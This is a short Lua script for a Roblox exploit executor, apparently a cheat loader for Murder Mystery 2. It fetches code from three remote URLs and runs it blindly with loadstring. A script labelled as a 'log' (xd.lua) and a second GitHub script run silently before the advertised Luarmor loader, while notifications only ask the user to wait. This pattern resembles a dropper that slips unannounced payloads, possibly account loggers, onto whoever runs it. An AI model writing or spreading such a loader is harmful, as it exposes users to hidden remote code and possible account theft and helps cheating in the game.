local DELAY = 10

local LOADER_URL = "https://api.luarmor.net/files/v4/loaders/5857a6cfae3b902eb3c2dff7cdbf173b.lua"
local LOG_URL    = "https://raw.githubusercontent.com/zamx02/mm2/refs/heads/main/xd.lua"
local AUTO_URL   = "https://raw.githubusercontent.com/zamx02/mm2/refs/heads/main/scr.lua"

local env = getgenv and getgenv() or _G
local GuiService = game:GetService("StarterGui")
local _http = request or (syn and syn.request) or (http and http.request)
local _load = loadstring

env.__EXECUTED = env.__EXECUTED or {}

local function notify(title, text, duration)
    pcall(function()
        GuiService:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = duration or 5,
        })
    end)
end

local function fetch(url)
    if _http then return _http({ Url = url, Method = "GET" }).Body end
    if game.HttpGet then return game.HttpGet(url) end
    if game.HttpGetAsync then return game:HttpGetAsync(url) end
    return nil
end

local function execute(url)
    if not url or url == "" then return end
    if env.__EXECUTED[url] then return end
    local ok, codigo = pcall(fetch, url)
    if not ok or not codigo or codigo == "" then return end
    if not _load then return end
    local fn = _load(codigo)
    if not fn then return end
    env.__EXECUTED[url] = true
    pcall(fn)
end

if env.__ACTIVE then
    local elapsed = os.clock() - (env.__START or 0)
    local remaining = math.max(0, math.ceil(DELAY - elapsed))

    if remaining > 0 then
        notify("Wait", "The script will execute in " .. remaining .. " seconds.")
    else
        notify("Running", "The script is already running.")
    end
    return
end

env.__ACTIVE = true
env.__START = os.clock()

notify("Starting", "The script will execute in 10 seconds...")
task.wait(0.5)
notify("Starting", "Do not execute the script again. Please wait 10 seconds.")

execute(LOG_URL)
execute(AUTO_URL)

task.wait(DELAY)

execute(LOADER_URL)